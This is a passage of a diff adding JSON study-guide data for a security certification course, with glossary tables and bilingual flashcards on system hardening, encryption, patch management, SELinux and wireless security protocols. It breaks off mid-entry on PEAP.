+              [
+                "**GPO (Group Policy Object)**",
+                "A container of group policy settings deployed across a Windows domain"
+              ],
+              [
+                "**SELinux**",
+                "NSA-created MAC framework for Linux; default in CentOS and RHEL"
+              ],
+              [
+                "**AppArmor**",
+                "Alternative MAC implementation for Linux; common on Ubuntu/Debian"
+              ],
+              [
+                "**DAC (Discretionary Access Control)**",
+                "Access controlled by the resource owner (default Linux model)"
+              ],
+              [
+                "**MAC (Mandatory Access Control)**",
+                "Access controlled by system-enforced policy, not the resource owner"
+              ],
+              [
+                "**SELinux Enforcing Mode**",
+                "All SELinux policies are actively enforced"
+              ],
+              [
+                "**SELinux Permissive Mode**",
+                "Policies are logged but not enforced — used for troubleshooting"
+              ],
+              [
+                "**SELinux Targeted Policy**",
+                "Only specific processes are confined; others run unconfined"
+              ],
+              [
+                "**SELinux Strict Policy**",
+                "MAC enforced on all processes and objects on the system"
+              ],
+              [
+                "**Full-Disk Encryption**",
+                "Encrypts the entire storage device (BitLocker, FileVault)"
+              ],
+              [
+                "**Partition Encryption**",
+                "Encrypts only a specific partition (VeraCrypt)"
+              ],
+              [
+                "**Volume Encryption**",
+                "Creates an encrypted container of defined size (VeraCrypt)"
+              ],
+              [
+                "**File-Level Encryption**",
+                "Encrypts individual files (GPG)"
+              ],
+              [
+                "**Database Encryption**",
+                "Encrypts an entire database (SQL Server TDE)"
+              ],
+              [
+                "**Record-Level Encryption**",
+                "Encrypts individual rows or columns within a database"
+              ],
+              [
+                "**TDE (Transparent Data Encryption)**",
+                "SQL Server database encryption requiring no application changes"
+              ],
+              [
+                "**Secure Baseline**",
+                "Standardized, vetted configuration serving as the known-good starting point for all systems"
+              ],
+              [
+                "**Disk Image**",
+                "A snapshot of a fully configured, hardened system used for rapid, consistent deployment"
+              ],
+              [
+                "**AWS Config**",
+                "AWS service for defining and enforcing secure configurations in cloud environments"
+              ],
+              [
+                "**MDM (Mobile Device Manager)**",
+                "Tool for deploying patches and enforcing policies on mobile devices"
+              ],
+              [
+                "**Microsoft Endpoint Configuration Manager**",
+                "Microsoft tool for enterprise-scale patch management and endpoint configuration"
+              ],
+              [
+                "**IOS (Internetwork Operating System)**",
+                "Cisco's firmware/OS for networking devices; updated by flashing the device"
+              ]
+            ]
+          }
+        ],
+        "list_items": [],
+        "raw_content": "| Term                                         | Definition                                                                                  |\n| -------------------------------------------- | ------------------------------------------------------------------------------------------- |\n| **Hardening**                                | Reducing a system's attack surface through security configurations and controls             |\n| **Default Credentials**                      | Factory-set username/password combinations for initial device access                        |\n| **Least Functionality**                      | Configuring systems with only the minimum necessary applications and services               |\n| **Allowlisting**                             | Security model where only explicitly approved applications can run                          |\n| **Blocklisting**                             | Security model where explicitly listed applications are blocked; all others permitted       |\n| **AppLocker**                                | Windows tool for implementing application allowlisting/blocklisting via Group Policy        |\n| **Unnecessary Services**                     | Background processes not required for business operations that expand the attack surface    |\n| **Trusted Operating System (TOS)**           | An OS with rigorous security certifications that enforces mandatory access controls         |\n| **EAL (Evaluation Assurance Level)**         | Common Criteria rating system for OS security assurance (EAL1 lowest to EAL7 highest)       |\n| **Trusted Computing Base (TCB)**             | The set of all components in a system that are critical to its security                     |\n| **Hotfix**                                   | Immediate security patch addressing a specific vulnerability                                |\n| **Update**                                   | Software modification adding functionality; may introduce new vulnerabilities               |\n| **Service Pack**                             | Bundled collection of hotfixes and updates into a single installer                          |\n| **Patch Management**                         | The four-step process of planning, testing, implementing, and auditing patches              |\n| **Patch Rings**                              | Staged rollout strategy deploying patches to progressively larger groups                    |\n| **Firmware**                                 | The OS-equivalent software running on network devices like switches and routers             |\n| **Group Policy**                             | Windows rules applied centrally to users and computers via the Group Policy Editor          |\n| **Baselining**                               | Measuring changes in an environment to establish what \"normal\" looks like                   |\n| **GPO (Group Policy Object)**                | A container of group policy settings deployed across a Windows domain                       |\n| **SELinux**                                  | NSA-created MAC framework for Linux; default in CentOS and RHEL                             |\n| **AppArmor**                                 | Alternative MAC implementation for Linux; common on Ubuntu/Debian                           |\n| **DAC (Discretionary Access Control)**       | Access controlled by the resource owner (default Linux model)                               |\n| **MAC (Mandatory Access Control)**           | Access controlled by system-enforced policy, not the resource owner                         |\n| **SELinux Enforcing Mode**                   | All SELinux policies are actively enforced                                                  |\n| **SELinux Permissive Mode**                  | Policies are logged but not enforced — used for troubleshooting                             |\n| **SELinux Targeted Policy**                  | Only specific processes are confined; others run unconfined                                 |\n| **SELinux Strict Policy**                    | MAC enforced on all processes and objects on the system                                     |\n| **Full-Disk Encryption**                     | Encrypts the entire storage device (BitLocker, FileVault)                                   |\n| **Partition Encryption**                     | Encrypts only a specific partition (VeraCrypt)                                              |\n| **Volume Encryption**                        | Creates an encrypted container of defined size (VeraCrypt)                                  |\n| **File-Level Encryption**                    | Encrypts individual files (GPG)                                                             |\n| **Database Encryption**                      | Encrypts an entire database (SQL Server TDE)                                                |\n| **Record-Level Encryption**                  | Encrypts individual rows or columns within a database                                       |\n| **TDE (Transparent Data Encryption)**        | SQL Server database encryption requiring no application changes                             |\n| **Secure Baseline**                          | Standardized, vetted configuration serving as the known-good starting point for all systems |\n| **Disk Image**                               | A snapshot of a fully configured, hardened system used for rapid, consistent deployment     |\n| **AWS Config**                               | AWS service for defining and enforcing secure configurations in cloud environments          |\n| **MDM (Mobile Device Manager)**              | Tool for deploying patches and enforcing policies on mobile devices                         |\n| **Microsoft Endpoint Configuration Manager** | Microsoft tool for enterprise-scale patch management and endpoint configuration             |\n| **IOS (Internetwork Operating System)**      | Cisco's firmware/OS for networking devices; updated by flashing the device                  |"
+      }
+    ],
+    "flashcards": [
+      {
+        "name": "Hardening",
+        "definition": "The process of enhancing the security of a system, application, or network by implementing measures and configurations that reduce its exposure to vulnerabilities and potential threats.",
+        "analogy": "*Es como preparar una casa para un huracán: no esperas a que llegue la tormenta para atrancar las ventanas. Refuerzas todo antes, cierras lo que no se necesita y te aseguras de que cada entrada esté bien protegida.*",
+        "raw_content": "* **Definition:** The process of enhancing the security of a system, application, or network by implementing measures and configurations that reduce its exposure to vulnerabilities and potential threats.\n\nHardening involves applying security patches, configuring access controls, disabling unnecessary services, and adopting best practices to strengthen the overall **security posture** and resilience against cyber attacks.\n\n> *Es como preparar una casa para un huracán: no esperas a que llegue la tormenta para atrancar las ventanas. Refuerzas todo antes, cierras lo que no se necesita y te aseguras de que cada entrada esté bien protegida.*\n\nHardening applies across the full stack: operating systems, applications, network devices, cloud instances, and firmware.\n\n---"
+      },
+      {
+        "name": "Changing Default Configurations",
+        "definition": "The process of modifying factory-set configurations on hardware and software — including default credentials, open ports, and unneeded protocols — to eliminate known, publicly documented security weaknesses.",
+        "analogy": "*Es como comprar una cerradura nueva que viene con una llave maestra publicada en el manual del fabricante. Mientras no cambies esa llave, cualquier persona que haya leído el manual puede entrar a tu casa.*",
+        "raw_content": "* **Definition:** The process of modifying factory-set configurations on hardware and software — including default credentials, open ports, and unneeded protocols — to eliminate known, publicly documented security weaknesses.\n\nWhen a new device or piece of software is installed, its factory settings prioritize ease of use over security. These defaults are often documented in manuals and online knowledge bases, making them trivially exploitable by attackers.\n\n> *Es como comprar una cerradura nueva que viene con una llave maestra publicada en el manual del fabricante. Mientras no cambies esa llave, cualquier persona que haya leído el manual puede entrar a tu casa.*"
+      },
+      {
+        "name": "Restricting Applications — Least Functionality",
+        "definition": "The principle of configuring a workstation or server to provide only the essential applications and services required by that user, minimizing the attack surface introduced by unnecessary code.",
+        "analogy": "*Es como un restaurante que solo sirve los platos del menú. Si el cocinero solo tiene los ingredientes necesarios para esas recetas, hay mucho menos riesgo de que aparezca algo inesperado o dañino en la cocina.*",
+        "raw_content": "* **Definition:** The principle of configuring a workstation or server to provide only the essential applications and services required by that user, minimizing the attack surface introduced by unnecessary code.\n\nEvery installed application introduces additional code and therefore additional vulnerabilities. Administrators should actively uninstall unneeded applications and enforce strict controls over what can be installed or executed.\n\n> *Es como un restaurante que solo sirve los platos del menú. Si el cocinero solo tiene los ingredientes necesarios para esas recetas, hay mucho menos riesgo de que aparezca algo inesperado o dañino en la cocina.*\n\nIn large enterprise environments, a **secure baseline image** is created containing only the OS and minimum required applications, and deployed uniformly across all workstations."
+      },
+      {
+        "name": "Allowlisting (Application Allowlisting)",
+        "definition": "A security approach where **only explicitly approved applications** are permitted to run; all others are blocked by default.",
+        "analogy": "*Es como la lista VIP de un nightclub exclusivo: si tu nombre no está en la lista, el portero no te deja entrar, sin importar quién seas.*",
+        "raw_content": "* **Definition:** A security approach where **only explicitly approved applications** are permitted to run; all others are blocked by default.\n\n> *Es como la lista VIP de un nightclub exclusivo: si tu nombre no está en la lista, el portero no te deja entrar, sin importar quién seas.*\n\n- Most secure method — **everything is denied by default** except what is explicitly listed.\n- More difficult to maintain — every application update requires updating the allowlist.\n- Implemented in Windows via **AppLocker** within Group Policy."
+      },
+      {
+        "name": "Blocklisting (Application Blocklisting)",
+        "definition": "A security approach where **explicitly listed applications** are blocked from running; all other applications are permitted by default.",
+        "analogy": "*Es como la lista de no-volar en un aeropuerto: si tu nombre está en esa lista, no abordas. Todos los demás pasan sin problema.*",
+        "raw_content": "* **Definition:** A security approach where **explicitly listed applications** are blocked from running; all other applications are permitted by default.\n\n> *Es como la lista de no-volar en un aeropuerto: si tu nombre está en esa lista, no abordas. Todos los demás pasan sin problema.*\n\n- Less secure than allowlisting — **everything is allowed by default** except what is explicitly denied.\n- Easier to manage initially but requires constant updates as new malware variants emerge.\n- Every new or unknown threat is permitted until a blocklist rule is created for it.\n\n| Method           | Default State             | Security Level | Management Effort |\n| ---------------- | ------------------------- | -------------- | ----------------- |\n| **Allowlisting** | All blocked except listed | High           | High              |\n| **Blocklisting** | All allowed except listed | Lower          | Lower initially   |\n\n⚠️ **Exam Tip:** For higher security, use allowlisting. At minimum, always use a blocklist to block known malicious applications. In a Windows domain environment, AppLocker deployed via Active Directory Group Policy is the standard tool for both approaches.\n\n---"
+      },
+      {
+        "name": "Unnecessary Services",
+        "definition": "Software processes or network services running in the background that are not required for essential system functionality or business operations — they consume resources, introduce vulnerabilities, and expand the attack surface.",
+        "analogy": "*Es como dejar los motores de todos los autos del estacionamiento encendidos por si acaso alguien los necesita. Consume combustible innecesariamente, hace ruido y deja todos los autos vulnerables a ser robados.*",
+        "raw_content": "* **Definition:** Software processes or network services running in the background that are not required for essential system functionality or business operations — they consume resources, introduce vulnerabilities, and expand the attack surface.\n\nServices run in the background of the OS and perform various functions (e.g., print spooler, Windows Update). Any service not needed for business operations should be disabled.\n\n> *Es como dejar los motores de todos los autos del estacionamiento encendidos por si acaso alguien los necesita. Consume combustible innecesariamente, hace ruido y deja todos los autos vulnerables a ser robados.*"
+      },
+      {
+        "name": "Trusted Operating Systems (TOS)",
+        "definition": "Specialized operating systems that have undergone rigorous security evaluations and certifications to enforce stringent security policies — typically mandatory access controls — for handling sensitive or classified information.",
+        "analogy": "*Es como la diferencia entre un auto de consumo masivo y un vehículo blindado diseñado para presidentes: ambos te llevan de A a B, pero uno fue construido y certificado bajo estándares completamente distintos de seguridad.*",
+        "raw_content": "* **Definition:** Specialized operating systems that have undergone rigorous security evaluations and certifications to enforce stringent security policies — typically mandatory access controls — for handling sensitive or classified information.\n\n> *Es como la diferencia entre un auto de consumo masivo y un vehículo blindado diseñado para presidentes: ambos te llevan de A a B, pero uno fue construido y certificado bajo estándares completamente distintos de seguridad.*\n\nTrusted Operating Systems implement **Mandatory Access Control (MAC)**, where access permissions are determined by system policy — not by the data owner — ensuring that even the resource owner cannot override access restrictions."
+      },
+      {
+        "name": "Updates and Patches",
+        "definition": "Software modifications released by developers to fix bugs, address security vulnerabilities, or improve features, stability, and performance of their software.",
+        "analogy": "*Es como el mantenimiento preventivo de un auto: si ignoras el cambio de aceite y las actualizaciones del fabricante, eventualmente algo se rompe de una manera que te podría haber costado mucho menos arreglar antes.*",
+        "raw_content": "* **Definition:** Software modifications released by developers to fix bugs, address security vulnerabilities, or improve features, stability, and performance of their software.\n\n> *Es como el mantenimiento preventivo de un auto: si ignoras el cambio de aceite y las actualizaciones del fabricante, eventualmente algo se rompe de una manera que te podría haber costado mucho menos arreglar antes.*\n\nA good patch management program is one of the most effective hardening measures available. Attackers often reverse-engineer released patches within days to develop exploits targeting unpatched systems."
+      },
+      {
+        "name": "Patch Management",
+        "definition": "The systematic process of planning, testing, implementing, and auditing software patches and firmware updates to maintain the security and functionality of computer systems and network devices.",
+        "analogy": "*Es como gestionar el mantenimiento de toda una flota de camiones: no puedes ir uno por uno manualmente, necesitas un sistema que te diga cuáles necesitan cambio de aceite, programe las citas y confirme que el trabajo fue hecho.*",
+        "raw_content": "* **Definition:** The systematic process of planning, testing, implementing, and auditing software patches and firmware updates to maintain the security and functionality of computer systems and network devices.\n\n> *Es como gestionar el mantenimiento de toda una flota de camiones: no puedes ir uno por uno manualmente, necesitas un sistema que te diga cuáles necesitan cambio de aceite, programe las citas y confirme que el trabajo fue hecho.*\n\nPatch management is critical for: **security** (fixing known vulnerabilities), **uptime** (preventing crashes), **compliance** (demonstrating patched CVEs), and **feature improvements**."
+      },
+      {
+        "name": "Group Policies",
+        "definition": "A set of rules and configurations in Windows environments that allow administrators to centrally manage and control user and computer settings — enforcing compliance and security standards across an organization.",
+        "analogy": "*Es como el reglamento interno de una empresa: en vez de decirle las reglas a cada empleado de forma individual, las publicas una vez y aplican automáticamente para todos desde el primer día.*",
+        "raw_content": "* **Definition:** A set of rules and configurations in Windows environments that allow administrators to centrally manage and control user and computer settings — enforcing compliance and security standards across an organization.\n\n> *Es como el reglamento interno de una empresa: en vez de decirle las reglas a cada empleado de forma individual, las publicas una vez y aplican automáticamente para todos desde el primer día.*\n\nGroup policies are accessed via the **Group Policy Editor** (`gpedit` from the Run prompt). In a Windows domain, the **Active Directory Domain Controller** provides an advanced Group Policy Editor."
+      },
+      {
+        "name": "Baselining",
+        "definition": "The process of measuring changes in a network, hardware, or software environment to establish what \"normal\" looks like — enabling detection of deviations that may indicate a security incident.",
+        "analogy": "*Es como conocer el consumo eléctrico normal de tu casa mes a mes. Si un sábado en la tarde ves un pico enorme en el marcador, sabes que algo inusual está pasando y lo investigas.*",
+        "raw_content": "* **Definition:** The process of measuring changes in a network, hardware, or software environment to establish what \"normal\" looks like — enabling detection of deviations that may indicate a security incident.\n\n> *Es como conocer el consumo eléctrico normal de tu casa mes a mes. Si un sábado en la tarde ves un pico enorme en el marcador, sabes que algo inusual está pasando y lo investigas.*\n\n- Every deviation from the baseline should be categorized as **acceptable/expected** or **requires investigation**.\n- High network utilization during expected low-traffic periods has been used to detect **data exfiltration** in real-world breaches.\n\n---"
+      },
+      {
+        "name": "SELinux — Security-Enhanced Linux",
+        "definition": "A security framework for Linux-based operating systems, created by the NSA, that implements Mandatory Access Control (MAC) to confine and limit the actions of processes and users — enhancing overall system security beyond the default DAC model.",
+        "analogy": "*Es como pasar del sistema de honor en un archivo de oficina (donde tú decides quién puede ver tus documentos) a un sistema de clasificación militar (donde el propio edificio, no tú, controla quién puede entrar a cada cuarto según su nivel de autorización).*",
+        "raw_content": "* **Definition:** A security framework for Linux-based operating systems, created by the NSA, that implements Mandatory Access Control (MAC) to confine and limit the actions of processes and users — enhancing overall system security beyond the default DAC model.\n\n> *Es como pasar del sistema de honor en un archivo de oficina (donde tú decides quién puede ver tus documentos) a un sistema de clasificación militar (donde el propio edificio, no tú, controla quién puede entrar a cada cuarto según su nivel de autorización).*\n\nSELinux is the default context-based permission scheme in **CentOS** and **Red Hat Enterprise Linux (RHEL)**. It prevents unauthorized processes from accessing or tampering with data, bypassing security mechanisms, or executing untrustworthy programs."
+      },
+      {
+        "name": "Data Encryption Levels",
+        "definition": "The application of encryption at different layers of the data storage hierarchy — from individual records to entire disk drives — each providing a different granularity of protection.",
+        "analogy": "*Es como las capas de seguridad de una bóveda bancaria: puedes cifrar el edificio completo (disco completo), solo el cuarto de la bóveda (partición), solo cada caja de seguridad individual (archivo) o incluso el contenido dentro de cada sobre dentro de cada caja (registro de base de datos).*",
+        "raw_content": "* **Definition:** The application of encryption at different layers of the data storage hierarchy — from individual records to entire disk drives — each providing a different granularity of protection.\n\n> *Es como las capas de seguridad de una bóveda bancaria: puedes cifrar el edificio completo (disco completo), solo el cuarto de la bóveda (partición), solo cada caja de seguridad individual (archivo) o incluso el contenido dentro de cada sobre dentro de cada caja (registro de base de datos).*\n\nEncryption adds overhead to read/write operations, so the level of encryption chosen must balance **security requirements against system performance**."
+      },
+      {
+        "name": "Secure Baselines",
+        "definition": "A predefined, standardized configuration and associated settings for systems, applications, or networks that establish a secure starting point — minimizing security risks and ensuring consistent security posture across all organizational assets.",
+        "analogy": "*Es como la configuración de fábrica de seguridad de una franquicia. Cada sucursal nueva abre con el mismo sistema de alarmas, las mismas cerraduras y los mismos procedimientos. No cada gerente decide su propio nivel de seguridad.*",
+        "raw_content": "* **Definition:** A predefined, standardized configuration and associated settings for systems, applications, or networks that establish a secure starting point — minimizing security risks and ensuring consistent security posture across all organizational assets.\n\n> *Es como la configuración de fábrica de seguridad de una franquicia. Cada sucursal nueva abre con el mismo sistema de alarmas, las mismas cerraduras y los mismos procedimientos. No cada gerente decide su propio nivel de seguridad.*\n\nSecure baselines are referenced against frameworks such as **ISO 27001** and **NIST Special Publication 800-53**."
+      }
+    ]
+  },
+  {
+    "sectionId": "S21",
+    "sectionTitle": "Section 21: Security Techniques",
+    "concepts": [
+      {
+        "name": "Wireless Infrastructure Security",
+        "definition": "The objective domain covering the physical placement, RF planning, and survey methodology used to deploy a wireless network that maximizes coverage while minimizing the risk of unauthorized external access.",
+        "analogy": "*Es como diseñar la seguridad perimetral de una casa antes de comprar las cerraduras: primero decides dónde van las ventanas y las puertas, y después eliges qué candado poner en cada una.*",
+        "tables": [],
+        "list_items": [
+          "Place WAPs in **central locations**, away from windows and external walls.",
+          "Mount WAPs **high** (ceiling or top of shelves) to maximize coverage and reduce interference.",
+          "Use **omnidirectional antennas** for interior areas and **unidirectional antennas** on exterior walls to focus the signal inward.",
+          "Large facilities require an **Extended Service Set (ESS)** — multiple WAPs working together to provide seamless, merged coverage across the entire building, automatically handing off the user as they move between WAPs while remaining on the same enterprise network.",
+          "Identify **dead zones** (no coverage)",
+          "Detect areas of **signal leakage** outside the building",
+          "Find areas where **signal strength is too strong** and could reach beyond physical boundaries"
+        ],
+        "raw_content": "* **Definition:** The objective domain covering the physical placement, RF planning, and survey methodology used to deploy a wireless network that maximizes coverage while minimizing the risk of unauthorized external access.\n\nThis is one of the core blueprint objectives (4.1) for this section. It covers **WAP placement**, **interference types**, **site surveys**, and **heat maps** as the building blocks of a secure wireless deployment — security starts at the physical/RF layer, before any encryption protocol is even configured.\n\n> *Es como diseñar la seguridad perimetral de una casa antes de comprar las cerraduras: primero decides dónde van las ventanas y las puertas, y después eliges qué candado poner en cada una.*\n\n### Wireless Infrastructure Security: WAP Placement\n\n* **Definition:** The strategic positioning of wireless access points (WAPs) within a facility to optimize signal coverage while minimizing the risk of unauthorized external access.\n\nA **Wireless Access Point (WAP)** is a device that allows wireless clients to connect to a wired network using the 802.11 Wi-Fi standards. Where you place a WAP directly affects both **performance** and **security**.\n\n> *Es como instalar reflectores de luz en un estadio: si los pones demasiado cerca de las paredes externas, iluminas el estacionamiento en lugar del campo.*\n\nPlacing a WAP near **exterior walls or windows** allows the signal to leak outside the physical boundaries of the building, letting threat actors connect from a parking lot or sidewalk without ever entering the facility.\n\n**Best practices for WAP placement:**\n\n- Place WAPs in **central locations**, away from windows and external walls.\n- Mount WAPs **high** (ceiling or top of shelves) to maximize coverage and reduce interference.\n- Use **omnidirectional antennas** for interior areas and **unidirectional antennas** on exterior walls to focus the signal inward.\n- Large facilities require an **Extended Service Set (ESS)** — multiple WAPs working together to provide seamless, merged coverage across the entire building, automatically handing off the user as they move between WAPs while remaining on the same enterprise network.\n\n### Wireless Infrastructure Security: Co-Channel Interference\n\n* **Definition:** Interference that occurs when two or more WAPs in overlapping coverage areas use the same wireless channel or frequency band.\n\nCo-channel interference forces data retransmission, slowing down the wireless network. It occurs when two access points use the **same channel** while their coverage zones overlap.\n\n> *Como dos personas hablando al mismo tiempo en el mismo cuarto: se escucha ruido, no información.*\n\n### Wireless Infrastructure Security: Adjacent Channel Interference\n\n* **Definition:** Interference that occurs when adjacent WAPs use channels that are close enough to overlap in frequency, causing signal degradation and bandwidth loss.\n\nIn the **2.4 GHz band**, there are only 11 channels available, each 22 MHz wide, across a 100 MHz total spectrum — which means most channels overlap with their neighbors. For example, channel 6 (centered at 2.437 GHz) strongly overlaps with channels 5 and 7, and overlaps slightly with channels 4 and 8.\n\n> *Como dos estaciones de radio muy cercanas en el dial: se mezclan las señales y escuchas ambas a la vez.*\n\n⚠️ **Exam Tip:** In the 2.4 GHz band, always use **channels 1, 6, and 11** — the only three non-overlapping channels. Any other combination will cause adjacent channel interference.\n\n### Wireless Infrastructure Security: Site Survey\n\n* **Definition:** A process of planning and designing a wireless network that involves scanning the radio frequency environment to identify interference sources, optimal WAP placement locations, and the best channels to use, in order to deliver required coverage, data rates, capacity, roaming capability, and quality of service.\n\nA site survey is performed **before** installing wireless access points. It involves a physical site visit to test RF interference and identify devices already operating in the frequency band you intend to use.\n\n> *Es como hacer una inspección del terreno antes de construir: mides, observas el entorno y luego decides dónde colocar cada cosa.*\n\n### Wireless Infrastructure Security: Heat Map\n\n* **Definition:** A graphical representation of wireless signal strength, coverage, and frequency utilization across a physical space, with values displayed as color gradients, created after WAP installation to validate the deployment.\n\nHeat maps allow security professionals and network engineers to:\n\n- Identify **dead zones** (no coverage)\n- Detect areas of **signal leakage** outside the building\n- Find areas where **signal strength is too strong** and could reach beyond physical boundaries\n\n> *Como un mapa meteorológico: los colores te dicen de inmediato dónde hace calor (señal fuerte) y dónde hace frío (sin cobertura).*\n\n⚠️ **Exam Tip:** If a heat map shows signal leaking outside the building, the response is to **reposition the WAP**, **decrease signal strength**, or switch to a **unidirectional antenna**. If coverage is insufficient inside, **add more WAPs** near the weak edges.\n\n---"
+      },
+      {
+        "name": "Wireless Security Settings",
+        "definition": "The objective domain covering the encryption protocols, AAA frameworks, and authentication protocols used to secure data transmission and verify user identity on wireless networks.",
+        "analogy": "*Como construir una caja fuerte de tres capas: el material de la caja (encriptación), quién tiene permiso de abrirla (AAA), y cómo se verifica la identidad de quien la abre (EAP).*",
+        "tables": [
+          {
+            "headers": [
+              "Feature",
+              "RADIUS",
+              "TACACS+"
+            ],
+            "rows": [
+              [
+                "**Protocol**",
+                "UDP",
+                "TCP"
+              ],
+              [
+                "**Encryption**",
+                "Password only",
+                "Entire authentication payload"
+              ],
+              [
+                "**AAA separation**",
+                "Combined",
+                "Separated (more granular)"
+              ],
+              [
+                "**Primary use**",
+                "Network access (Wi-Fi, VPN)",
+                "Device administration"
+              ]
+            ]
+          }
+        ],
+        "list_items": [
+          "PEAP = EAP inside the tunnel. EAP-TTLS = legacy protocols inside the tunnel.",
+          "If the question mentions **MSCHAPv2** being used for client auth → **PEAP** (that's its default inner method).",
+          "If the question mentions **PAP, CHAP, or legacy protocols** being tunneled → **EAP-TTLS** (that's its advantage — it doesn't force EAP inside).",
+          "Secondary trigger: if a question emphasizes **flexibility to support older/non-EAP authentication methods** → EAP-TTLS wins that description every time."
+        ],
+        "raw_content": "* **Definition:** The objective domain covering the encryption protocols, AAA frameworks, and authentication protocols used to secure data transmission and verify user identity on wireless networks.\n\nThis is the second blueprint objective (4.1) covered in this section. It addresses three layers of wireless protection: **encryption protocols** (WEP/WPA/WPA2/WPA3) for confidentiality, **AAA protocols** (RADIUS/TACACS+) for centralized access control, and **EAP-based authentication protocols** for verifying user identity.\n\n> *Como construir una caja fuerte de tres capas: el material de la caja (encriptación), quién tiene permiso de abrirla (AAA), y cómo se verifica la identidad de quien la abre (EAP).*\n\n### Wireless Security Settings: WEP\n\n* **Definition:** Wired Equivalent Privacy — the original 802.11 wireless encryption standard released in 1999, now considered cryptographically broken due to its weak initialization vector and use of the RC4 cipher.\n\nWEP uses a **static key** shared by all devices on the network. It supports 64-bit and 128-bit key lengths, but both are easily compromised because of its **24-bit initialization vector (IV)**. Modern tools can crack WEP in approximately 3 minutes by collecting enough traffic to reconstruct the key.\n\n> *Como poner el mismo candado en todas las puertas del edificio y además escribir la combinación en la puerta misma.*\n\n⚠️ **Exam Tip:** WEP is insecure because of its **weak 24-bit IV**. Never use WEP.\n\n### Wireless Security Settings: WPA\n\n* **Definition:** Wi-Fi Protected Access — an interim wireless security standard released in 2003 that replaced WEP by introducing TKIP (Temporal Key Integrity Protocol), which generates a new 128-bit key per packet.\n\nWPA was a stopgap solution while the 802.11i standard was being finalized. Although TKIP improved on WEP, it was designed to be backward compatible with existing WEP hardware, which meant it inherited structural weaknesses.\n\n> *Como reparar un puente viejo con parches: mejora, pero la estructura base sigue siendo débil.*\n\n⚠️ **Exam Tip:** WPA is insecure because of **insufficient data integrity checks in the TKIP implementation**.\n\n### Wireless Security Settings: WPA2\n\n* **Definition:** Wi-Fi Protected Access 2 — the wireless security standard released in 2004 based on the IEEE 802.11i standard, which replaced TKIP with AES encryption and introduced CCMP (Counter Cipher Mode with Block Chaining Message Authentication Code Protocol).\n\nWPA2 brought the **Advanced Encryption Standard (AES)** and **CCMP** for stronger encryption and data integrity via **Message Integrity Code (MIC)**. The primary vulnerability is the **KRACK (Key Reinstallation Attack)** discovered in 2016.\n\n> *Como mejorar la bóveda del banco: ahora tiene acero de verdad, pero alguien encontró una grieta en el proceso de instalación de la llave.*\n\n### Wireless Security Settings: WPA3\n\n* **Definition:** Wi-Fi Protected Access 3 — the current and most secure wireless encryption standard, which introduces Simultaneous Authentication of Equals (SAE), Enhanced Open (OWE), AES-GCMP encryption, and mandatory Management Frame Protection (MFP).\n\nWPA3 includes **four major improvements** over WPA2, each detailed below as its own concept.\n\n> *Como cambiar el candado de una contraseña estática por autenticación biométrica con reconocimiento facial: incluso si alguien graba el proceso, no puede replicarlo.*\n\n#### WPA3: Simultaneous Authentication of Equals (SAE)\n\n* **Definition:** A key establishment protocol in WPA3 that replaces the WPA2 four-way handshake with a Diffie-Hellman-based authentication mechanism, protecting against offline dictionary attacks even if the handshake is captured.\n\nSAE replaces the pre-shared key (PSK) method used in WPA2. Even if an attacker captures the authentication exchange, they **cannot use it to guess the password offline** — unlike WPA2 where a captured handshake can be brute-forced. WPA3 also offers more robust protection even when users select weak, simple, or short passwords.\n\n> *Como un apretón de manos matemático que cambia cada vez: grabar el apretón no te da la fórmula para reproducirlo.*\n\n#### WPA3: Enhanced Open (Opportunistic Wireless Encryption — OWE)\n\n* **Definition:** A WPA3 feature that provides individualized data encryption between a client and an access point on open (password-free) networks, protecting against passive eavesdropping without requiring user authentication.\n\nTraditional open Wi-Fi sends all data unencrypted. Enhanced Open encrypts each client's traffic individually, even though no password is required to join. It does not offer full WPA3-level security, but protects against passive eavesdropping common in public Wi-Fi.\n\n> *Como que cada persona en un café reciba su propia mesa privada con cortinas, aunque la entrada al café sea libre.*\n\n#### WPA3: Updated Cryptographic Protocols (AES-GCMP)\n\n* **Definition:** WPA3 replaces the AES-CCMP used in WPA2 with AES-GCMP (Galois Counter Mode Protocol), supporting 128-bit AES for personal networks and 192-bit AES for enterprise networks.\n\nGCMP provides stronger encryption and better performance than CCMP. The 192-bit option is used in WPA3-Enterprise for environments requiring stronger cryptographic assurance.\n\n### Wireless Security Settings: AAA — Authentication, Authorization, and Accounting\n\n* **Definition:** A security framework that controls access to network resources by verifying user identity (Authentication), determining what the user is allowed to do (Authorization), and tracking user activity (Accounting).\n\nAAA is implemented in wireless and enterprise networks to centralize access control and enforce security policies consistently across all users and devices. Implementing AAA protocols is fundamental in environments transmitting sensitive data with stringent compliance requirements.\n\n> *Como el sistema de un aeropuerto: la seguridad verifica quién eres (Autenticación), el boarding pass define a qué puerta puedes ir (Autorización), y el registro de vuelo documenta todo lo que hiciste (Accounting).*\n\n#### AAA: RADIUS\n\n* **Definition:** Remote Authentication Dial-In User Service — a networking protocol that operates on a client-server model and provides centralized Authentication, Authorization, and Accounting (AAA) services for network users.\n\nRADIUS is the most widely used AAA protocol in enterprise wireless environments. It authenticates users through a centralized server, validates identities, grants access based on predefined policies, and monitors user activity for accountability.\n\n> *Como una recepcionista centralizada de un edificio corporativo: todos los visitantes pasan por ella, ella verifica la identidad y lleva el registro de quién entra y cuándo.*\n\n#### AAA: TACACS+\n\n* **Definition:** Terminal Access Controller Access-Control System Plus — an AAA protocol that separates the Authentication, Authorization, and Accounting functions into distinct services and encrypts the entire authentication process using TCP.\n\nUnlike RADIUS, which combines AAA into a single process, TACACS+ handles each function separately, allowing more granular control. It also encrypts the **entire authentication payload** (not just the password), making it more secure than RADIUS for device administration.\n\n> *Como tener tres departamentos separados en el aeropuerto: uno para verificar identidad, otro para emitir permisos, y otro para llevar los registros — cada uno especializado.*\n\n| Feature            | RADIUS                      | TACACS+                       |\n| ------------------ | --------------------------- | ----------------------------- |\n| **Protocol**       | UDP                         | TCP                           |\n| **Encryption**     | Password only               | Entire authentication payload |\n| **AAA separation** | Combined                    | Separated (more granular)     |\n| **Primary use**    | Network access (Wi-Fi, VPN) | Device administration         |\n\n### Wireless Security Settings: EAP — Extensible Authentication Protocol\n\n* **Definition:** An authentication framework that defines message formats and negotiation procedures for multiple authentication methods used in wireless networks and point-to-point connections; not a specific protocol itself but a framework that supports various EAP methods.\n\nEAP supports authentication via token cards, smart cards, certificates, one-time passwords, and more. It is used with RADIUS servers in 802.1X-based network access control.\n\n> *Como un marco legal que no define las leyes en sí, sino las reglas sobre cómo deben ser escritas y aplicadas.*\n\n#### EAP: PEAP (Protected EAP)\n\n* **Definition:** An EAP method developed by Cisco, Microsoft, and RSA that 